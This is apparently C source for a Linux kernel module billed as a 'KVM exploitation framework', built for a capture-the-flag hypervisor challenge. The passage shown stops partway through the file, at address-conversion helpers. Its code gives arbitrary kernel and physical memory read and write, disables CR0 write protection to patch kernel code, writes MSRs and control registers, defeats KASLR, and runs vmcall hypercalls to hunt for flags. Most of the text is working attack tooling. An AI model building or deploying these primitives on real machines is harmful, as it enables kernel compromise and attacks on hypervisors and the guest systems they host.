/*
 * KVM Probe Driver - Core Infrastructure
 * Builds KVM exploitation primitives step by step
 * 
 * Step 1: Symbol Operations (Complete)
 * Step 2: Memory Read Operations (Complete)
 * Step 3: Memory Write Operations (Complete)
 * Step 4: Address Conversion Operations (Complete)
 * Step 5: Hypercall Operations (Complete)
 * 
 * FEATURE: Hypercalls 100-103 run automatically after every read/write/scan
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/kvm_para.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/pgtable.h>
#include <linux/version.h>
#include <linux/highmem.h>
#include <linux/pfn.h>
#include <asm/io.h>

#ifdef CONFIG_X86
#include <asm/special_insns.h>
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include <asm/msr.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Exploitation Framework");
MODULE_DESCRIPTION("KVM exploitation framework with auto-hypercall support");
MODULE_VERSION("2.1");

/* ========================================================================
 * Global Variables
 * ======================================================================== */
static int major_num = -1;
static struct class *driver_class = NULL;
static struct device *driver_device = NULL;
static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static bool g_kaslr_initialized = false;

/* ========================================================================
 * IOCTL Definitions
 * ======================================================================== */
#define IOCTL_BASE 0x4000

/* Symbol operations (Step 1) */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)

/* Memory read operations (Step 2) */
#define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION      (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN     (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER        (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR                (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
#define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)

/* Memory write operations (Step 3) */
#define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR               (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER       (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL           (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL         (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)

/* Address conversion operations (Step 4) */
#define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN              (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA              (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN              (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN              (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA              (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS            (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT            (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN             (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN             (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE             (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN             (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)

/* Hypercall operations (Step 5) */
#define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)

/* ========================================================================
 * Data Structures
 * ======================================================================== */

struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char __user *buffer;
    size_t buffer_size;
    int region_type;
};

struct mem_pattern {
    unsigned char pattern[16];
    size_t pattern_len;
    int match_offset;
};

struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
    int disable_wp_flag;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char __user *user_buffer;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char __user *user_buffer;
    int mode;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct hypercall_batch_result {
    unsigned long ret_100;
    unsigned long ret_101;
    unsigned long ret_102;
    unsigned long ret_103;
};

/* ========================================================================
 * Symbol Database
 * ======================================================================== */

typedef struct {
    const char *name;
    unsigned long address;
    const char *description;
} kvm_symbol_t;

static kvm_symbol_t kvm_symbols[] = {
    {"kvm_sev_hc_page_enc_status", 0, "SEV page encryption status"},
    {"kvm_guest_apic_eoi_write", 0, "Guest APIC EOI write"},
    {"kvm_read_and_reset_apf_flags", 0, "Read/reset async page fault flags"},
    {"kvm_vcpu_gfn_to_hva", 0, "GFN to HVA translation"},
    {"kvm_vcpu_gfn_to_pfn", 0, "GFN to PFN"},
    {"kvm_read_guest_page", 0, "Read guest page"},
    {"kvm_read_guest", 0, "Read guest memory"},
    {"kvm_write_guest_page", 0, "Write guest page"},
    {"kvm_write_guest", 0, "Write guest memory"},
    {"kvm_io_bus_write", 0, "KVM I/O bus write"},
    {"kvm_handle_page_fault", 0, "Handle page fault"},
    {"kvm_mmu_page_fault", 0, "MMU page fault"},
    {"kvm_arch_vcpu_ioctl_run", 0, "VCPU ioctl run"},
    {"vmx_vcpu_run", 0, "VMX VCPU run"},
    {"svm_vcpu_run", 0, "SVM VCPU run"},
    {"kvm_emulate_instruction", 0, "Emulate instruction"},
    {NULL, 0, NULL}
};

static unsigned int kvm_symbol_count = 0;

static struct { const char *name; unsigned long address; } vmx_handlers[] = {
    {"handle_exception_nmi", 0}, {"handle_io", 0}, {"handle_cr", 0},
    {"handle_ept_violation", 0}, {"handle_ept_misconfig", 0},
    {"handle_apic_access", 0}, {"handle_task_switch", 0}, {NULL, 0}
};

static struct { const char *name; unsigned long address; } svm_handlers[] = {
    {"svm_handle_exit", 0}, {"svm_intr_intercept", 0}, {NULL, 0}
};

/* ========================================================================
 * Kernel Symbol Lookup
 * ======================================================================== */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kp) < 0) return -1;
    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_ptr ? 0 : -1;
}

static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name_ptr ? kallsyms_lookup_name_ptr(name) : 0;
}
#else
static int kallsyms_lookup_init(void) { return 0; }
static unsigned long lookup_kernel_symbol(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

static int init_symbol_database(void)
{
    int i;
    for (i = 0; kvm_symbols[i].name != NULL; i++) {
        kvm_symbols[i].address = lookup_kernel_symbol(kvm_symbols[i].name);
        if (kvm_symbols[i].address) kvm_symbol_count++;
    }
    for (i = 0; vmx_handlers[i].name != NULL; i++)
        vmx_handlers[i].address = lookup_kernel_symbol(vmx_handlers[i].name);
    for (i = 0; svm_handlers[i].name != NULL; i++)
        svm_handlers[i].address = lookup_kernel_symbol(svm_handlers[i].name);
    return kvm_symbol_count > 0 ? 0 : -ENOENT;
}

/* ========================================================================
 * KASLR Handling
 * ======================================================================== */

static int init_kaslr(void)
{
    unsigned long stext_addr = lookup_kernel_symbol("_stext");
    if (!stext_addr) stext_addr = lookup_kernel_symbol("_text");
    if (!stext_addr) stext_addr = lookup_kernel_symbol("startup_64");
    if (!stext_addr) return -ENOENT;

    g_kernel_text_base = stext_addr;
    g_kaslr_slide = stext_addr - 0xffffffff81000000UL;
    g_kaslr_initialized = true;
    return 0;
}

/* ========================================================================
 * Hypercall Implementation - CORE FEATURE
 * Runs automatically after every read/write/scan
 * ======================================================================== */

#ifdef CONFIG_X86
static noinline unsigned long do_kvm_hypercall(unsigned long nr, unsigned long a0,
                                                unsigned long a1, unsigned long a2,
                                                unsigned long a3)
{
    unsigned long ret;
    asm volatile("vmcall"
                 : "=a"(ret)
                 : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
                 : "memory");
    return ret;
}

/*
 * Run CTF hypercalls 100-103 - called after every operation
 * Only logs if result is NOT 0 and NOT 0xffffffffffffffff
 */
static void run_ctf_hypercalls(void)
{
    unsigned long ret;
    int i;
    const unsigned long hypercalls[] = {100, 101, 102, 103};
    
    for (i = 0; i < 4; i++) {
        ret = do_kvm_hypercall(hypercalls[i], 0, 0, 0, 0);
        if (ret != 0 && ret != ~0UL) {
            printk(KERN_INFO "%s: [CTF] Hypercall %lu returned 0x%lx\n",
                   DRIVER_NAME, hypercalls[i], ret);
            if (ret > 0x20202020UL) {
                unsigned char *p = (unsigned char *)&ret;
                int printable = 1, j;
                for (j = 0; j < 8 && p[j]; j++) {
                    if (p[j] < 0x20 || p[j] > 0x7e) { printable = 0; break; }
                }
                if (printable && p[0])
                    printk(KERN_INFO "%s: [CTF] Possible ASCII: %.8s\n", DRIVER_NAME, (char *)&ret);
            }
        }
    }
}

static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result)
{
    result->ret_100 = do_kvm_hypercall(100, 0, 0, 0, 0);
    result->ret_101 = do_kvm_hypercall(101, 0, 0, 0, 0);
    result->ret_102 = do_kvm_hypercall(102, 0, 0, 0, 0);
    result->ret_103 = do_kvm_hypercall(103, 0, 0, 0, 0);
    
    if (result->ret_100 != 0 && result->ret_100 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC100: 0x%lx\n", DRIVER_NAME, result->ret_100);
    if (result->ret_101 != 0 && result->ret_101 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC101: 0x%lx\n", DRIVER_NAME, result->ret_101);
    if (result->ret_102 != 0 && result->ret_102 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC102: 0x%lx\n", DRIVER_NAME, result->ret_102);
    if (result->ret_103 != 0 && result->ret_103 != ~0UL)
        printk(KERN_INFO "%s: [CTF] HC103: 0x%lx\n", DRIVER_NAME, result->ret_103);
}
#else
static void run_ctf_hypercalls(void) {}
static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result) {
    memset(result, 0xff, sizeof(*result));
}
#endif

/* ========================================================================
 * x86 Control Register & MSR Functions
 * ======================================================================== */

#ifdef CONFIG_X86
static inline unsigned long native_read_cr3_local(void)
{
    unsigned long val;
    asm volatile("mov %%cr3, %0" : "=r"(val));
    return val;
}

static unsigned long read_cr_register(int cr_num)
{
    switch (cr_num) {
        case 0: return native_read_cr0();
        case 2: return native_read_cr2();
        case 3: return native_read_cr3_local();
        case 4: return native_read_cr4();
        default: return 0;
    }
}

static unsigned long disable_wp(void)
{
    unsigned long cr0 = native_read_cr0();
    native_write_cr0(cr0 & ~(1UL << 16));
    return cr0;
}

static void restore_wp(unsigned long cr0) { native_write_cr0(cr0); }
#endif

/* ========================================================================
 * Memory Read Implementations (with auto-hypercall)
 * ======================================================================== */

static inline bool is_kernel_address(unsigned long addr) { return addr >= PAGE_OFFSET; }

static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size)
{
    int i;
    if (!is_kernel_address(addr)) return -EINVAL;
    
    preempt_disable();
    barrier();
    for (i = 0; i < size; i++)
        buffer[i] = *((unsigned char *)addr + i);
    barrier();
    preempt_enable();
    return 0;
}

static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, copied = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) return copied > 0 ? 0 : -EFAULT;
        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);
        copied += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }
    return 0;
}

static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy, copied = 0;

    while (copied < size) {
        if (!pfn_valid(pfn)) return copied > 0 ? 0 : -EINVAL;
        page = pfn_to_page(pfn);
        if (!page) return copied > 0 ? 0 : -EFAULT;
        kaddr = kmap_atomic(page);
        if (!kaddr) return copied > 0 ? 0 : -ENOMEM;
        to_copy = min(size - copied, (size_t)(PAGE_SIZE - offset));
        memcpy(buffer + copied, kaddr + offset, to_copy);
        kunmap_atomic(kaddr);
        copied += to_copy;
        pfn++;
        offset = 0;
    }
    return 0;
}

static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size)
{
    return read_physical_memory(gpa, buffer, size);
}

static int scan_memory_region(struct mem_region *region, struct mem_pattern *pattern,
                               unsigned long __user *results, int max_results)
{
    unsigned long current_addr;
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    int found = 0, ret;

    if (region->end <= region->start || region->step == 0) return -EINVAL;

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) return -ENOMEM;

    for (current_addr = region->start; current_addr < region->end && found < max_results; 
         current_addr += region->step) {
        size_t to_read = min(buffer_size, region->end - current_addr);
        size_t i;

        switch (region->region_type) {
            case 0: ret = read_physical_memory(current_addr, scan_buffer, to_read); break;
            case 1: ret = read_kernel_memory(current_addr, scan_buffer, to_read); break;
            case 2: ret = read_guest_memory_gpa(current_addr, scan_buffer, to_read); break;
            default: ret = -EINVAL;
        }
        if (ret < 0) continue;

        if (to_read >= pattern->pattern_len) {
            for (i = 0; i <= to_read - pattern->pattern_len; i++) {
                if (memcmp(scan_buffer + i, pattern->pattern, pattern->pattern_len) == 0) {
                    unsigned long found_addr = current_addr + i;
                    if (pattern->match_offset == -1 || pattern->match_offset == (int)i) {
                        if (results && found < max_results)
                            if (put_user(found_addr, results + found)) { kfree(scan_buffer); return -EFAULT; }
                        found++;
                    }
                }
            }
        }
    }

    kfree(scan_buffer);
    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER SCAN */
    return found;
}

static int find_pattern_in_range(unsigned long start, unsigned long end,
                                  const unsigned char *pattern, size_t pattern_len,
                                  unsigned long *found_addr, int region_type)
{
    unsigned char *scan_buffer;
    size_t buffer_size = 4096;
    unsigned long current_addr;
    int ret;

    scan_buffer = kmalloc(buffer_size, GFP_KERNEL);
    if (!scan_buffer) return -ENOMEM;

    for (current_addr = start; current_addr < end; current_addr += buffer_size) {
        size_t to_read = min(buffer_size, end - current_addr);
        size_t i;

        switch (region_type) {
            case 0: ret = read_physical_memory(current_addr, scan_buffer, to_read); break;
            case 1: ret = read_kernel_memory(current_addr, scan_buffer, to_read); break;
            default: ret = -EINVAL;
        }
        if (ret < 0) continue;

        for (i = 0; i + pattern_len <= to_read; i++) {
            if (memcmp(scan_buffer + i, pattern, pattern_len) == 0) {
                *found_addr = current_addr + i;
                kfree(scan_buffer);
                run_ctf_hypercalls();  /* AUTO HYPERCALL */
                return 0;
            }
        }
    }

    kfree(scan_buffer);
    run_ctf_hypercalls();  /* AUTO HYPERCALL EVEN IF NOT FOUND */
    return -ENOENT;
}

#ifdef CONFIG_X86
static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dump)
{
    pgd_t *pgd; p4d_t *p4d; pud_t *pud; pmd_t *pmd; pte_t *pte;
    struct mm_struct *mm = current->mm ? current->mm : current->active_mm;
    if (!mm) return -EINVAL;

    dump->virtual_addr = virt_addr;
    dump->pml4e = dump->pdpte = dump->pde = dump->pte = dump->physical_addr = 0;
    dump->flags = 0;

    pgd = pgd_offset(mm, virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) return -EFAULT;
    dump->pml4e = pgd_val(*pgd);

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) return -EFAULT;

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud)) return -EFAULT;
    dump->pdpte = pud_val(*pud);
    if (pud_leaf(*pud)) {
        dump->physical_addr = (pud_val(*pud) & PUD_MASK) | (virt_addr & ~PUD_MASK);
        dump->flags |= 0x01;
        return 0;
    }

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd)) return -EFAULT;
    dump->pde = pmd_val(*pmd);
    if (pmd_leaf(*pmd)) {
        dump->physical_addr = (pmd_val(*pmd) & PMD_MASK) | (virt_addr & ~PMD_MASK);
        dump->flags |= 0x02;
        return 0;
    }

    pte = pte_offset_kernel(pmd, virt_addr);
    if (!pte || pte_none(*pte)) return -EFAULT;
    dump->pte = pte_val(*pte);
    dump->physical_addr = (pte_val(*pte) & PAGE_MASK) | (virt_addr & ~PAGE_MASK);
    return 0;
}
#endif

/* ========================================================================
 * Memory Write Implementations (with auto-hypercall)
 * ======================================================================== */

static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
                                size_t size, int disable_wp_flag)
{
    unsigned long orig_cr0 = 0;
    int i;

    if (!is_kernel_address(addr)) return -EINVAL;

#ifdef CONFIG_X86
    if (disable_wp_flag) orig_cr0 = disable_wp();
#endif

    preempt_disable();
    barrier();
    for (i = 0; i < size; i++)
        *((unsigned char *)addr + i) = buffer[i];
    barrier();
    preempt_enable();

#ifdef CONFIG_X86
    if (disable_wp_flag) restore_wp(orig_cr0);
#endif

    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
    return 0;
}

static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, written = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) return written > 0 ? 0 : -EFAULT;
        memcpy_toio(mapped + offset, buffer + written, chunk_size);
        iounmap(mapped);
        written += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }

    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
    return 0;
}

static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy, written = 0;

    while (written < size) {
        if (!pfn_valid(pfn)) return written > 0 ? 0 : -EINVAL;
        page = pfn_to_page(pfn);
        if (!page) return written > 0 ? 0 : -EFAULT;
        kaddr = kmap_atomic(page);
        if (!kaddr) return written > 0 ? 0 : -ENOMEM;
        to_copy = min(size - written, (size_t)(PAGE_SIZE - offset));
        memcpy(kaddr + offset, buffer + written, to_copy);
        kunmap_atomic(kaddr);
        written += to_copy;
        pfn++;
        offset = 0;
    }

    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
    return 0;
}

static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, size_t size)
{
    return write_physical_memory(gpa, buffer, size);
}

#ifdef CONFIG_X86
static int write_msr_safe_local(u32 msr, u64 value)
{
    u32 low = value & 0xFFFFFFFF;
    u32 high = value >> 32;
    int err;

    asm volatile("1: wrmsr\n"
                 "2:\n"
                 ".section .fixup,\"ax\"\n"
                 "3: mov %4, %0\n"
                 "   jmp 2b\n"
                 ".previous\n"
                 _ASM_EXTABLE(1b, 3b)
                 : "=r"(err)
                 : "c"(msr), "a"(low), "d"(high), "i"(-EIO), "0"(0));

    if (!err) run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER MSR WRITE */
    return err;
}

static int write_cr_register(int cr_num, unsigned long value, unsigned long mask)
{
    unsigned long current_val, new_val;
    if (mask == 0) mask = ~0UL;

    switch (cr_num) {
        case 0:
            current_val = native_read_cr0();
            new_val = (current_val & ~mask) | (value & mask);
            native_write_cr0(new_val);
            break;
        case 3:
            current_val = native_read_cr3_local();
            new_val = (current_val & ~mask) | (value & mask);
            asm volatile("mov %0, %%cr3" : : "r"(new_val) : "memory");
            break;
        case 4:
            current_val = native_read_cr4();
            new_val = (current_val & ~mask) | (value & mask);
            __write_cr4(new_val);
            break;
        default:
            return -EINVAL;
    }

    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER CR WRITE */
    return 0;
}
#endif

static int memset_kernel_memory(unsigned long addr, unsigned char value, size_t size)
{
    unsigned char *buffer = kmalloc(size, GFP_KERNEL);
    int ret;
    if (!buffer) return -ENOMEM;
    memset(buffer, value, size);
    ret = write_kernel_memory(addr, buffer, size, 1);
    kfree(buffer);
    return ret;
}

static int memset_physical_memory(unsigned long phys_addr, unsigned char value, size_t size)
{
    unsigned char *buffer = kmalloc(size, GFP_KERNEL);
    int ret;
    if (!buffer) return -ENOMEM;
    memset(buffer, value, size);
    ret = write_physical_memory(phys_addr, buffer, size);
    kfree(buffer);
    return ret;
}

static int patch_memory(unsigned long addr, const unsigned char *original,
                         const unsigned char *patch, size_t length,
                         int verify_original, int addr_type)
{
    unsigned char *current_bytes;
    int ret;

    if (length > 32) return -EINVAL;
    current_bytes = kmalloc(length, GFP_KERNEL);
    if (!current_bytes) return -ENOMEM;

    if (addr_type == 0)
        ret = read_kernel_memory(addr, current_bytes, length);
    else
        ret = read_physical_memory(addr, current_bytes, length);

    if (ret < 0) { kfree(current_bytes); return ret; }

    if (verify_original && memcmp(current_bytes, original, length) != 0) {
        kfree(current_bytes);
        return -EILSEQ;
    }

    if (addr_type == 0)
        ret = write_kernel_memory(addr, patch, length, 1);
    else
        ret = write_physical_memory(addr, patch, length);

    kfree(current_bytes);
    return ret;
}

/* ========================================================================
 * Address Conversion Implementations
 * ======================================================================== */

static int convert_virt_to_phys(unsigned long virt_addr, struct virt_to_phys_request *req)
{
    unsigned long phys;
    req->virt_addr = virt_addr;
    req->phys_addr = req->pfn = req->offset = 0;
    req->status = -EFAULT;

    if (virt_addr >= PAGE_OFFSET && virt_addr < (unsigned long)high_memory) {
        phys = __pa(virt_addr);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->offset = phys & ~PAGE_MASK;
        req->status = 0;
        return 0;
    }

    if (is_vmalloc_addr((void *)virt_addr)) {
        struct page *page = vmalloc_to_page((void *)virt_addr);
        if (page) {
            phys = page_to_phys(page) | (virt_addr & ~PAGE_MASK);
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = virt_addr & ~PAGE_MASK;
            req->status = 0;
            return 0;
        }
    }

    if (virt_addr >= TASK_SIZE) {
        phys = virt_to_phys((void *)virt_addr);
        if (phys) {
            req->phys_addr = phys;
            req->pfn = phys >> PAGE_SHIFT;
            req->offset = phys & ~PAGE_MASK;
            req->status = 0;
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_phys_to_virt(unsigned long phys_addr, struct phys_to_virt_request *req)
{
    req->phys_addr = phys_addr;
    req->virt_addr = 0;
    req->status = -EFAULT;

    if (req->use_ioremap) {
        void __iomem *mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (mapped) {
            req->virt_addr = (unsigned long)mapped + (phys_addr & ~PAGE_MASK);
            req->status = 0;
            return 0;
        }
    } else {
        if (phys_addr < (unsigned long)high_memory - PAGE_OFFSET) {
            req->virt_addr = (unsigned long)phys_to_virt(phys_addr);
            req->status = 0;
            return 0;
        }
        req->virt_addr = (unsigned long)__va(phys_addr);
        if (virt_addr_valid(req->virt_addr)) {
            req->status = 0;
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
{
    struct page *page;
    req->hva = hva;
    req->pfn = 0;
    req->status = -EFAULT;

    if (hva >= PAGE_OFFSET && hva < (unsigned long)high_memory) {
        req->pfn = __pa(hva) >> PAGE_SHIFT;
        req->status = 0;
        return 0;
    }

    if (is_vmalloc_addr((void *)hva)) {
        page = vmalloc_to_page((void *)hva);
        if (page) {
            req->pfn = page_to_pfn(page);
            req->status = 0;
            return 0;
        }
    }

    if (hva < TASK_SIZE && current->mm) {
        int ret;
        mmap_read_lock(current->mm);
        ret = get_user_pages(hva, 1, 0, &page, NULL);
        mmap_read_unlock(current->mm);
        if (ret == 1) {
            req->pfn = page_to_pfn(page);
            req->status = 0;
            put_page(page);
            return 0;
        }
    }
    return -EFAULT;
}

static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
{
    struct page *page;
    if (!pfn_valid(pfn)) return -EINVAL;
    page = pfn_to_page(pfn);
    if (!page) return -EFAULT;
    *hva = (unsigned long)page_address(page);
    if (!*hva) {
        *hva = (unsigned long)kmap(page);
        if (*hva) kunmap(page);
    }
    return *hva ? 0 : -EFAULT;
}

static inline unsigned long gpa_to_gfn_local(unsigned long gpa) { return gpa >> PAGE_SHIFT; }
static inline unsigned long gfn_to_gpa_local(unsigned long gfn) { return gfn << PAGE_SHIFT; }

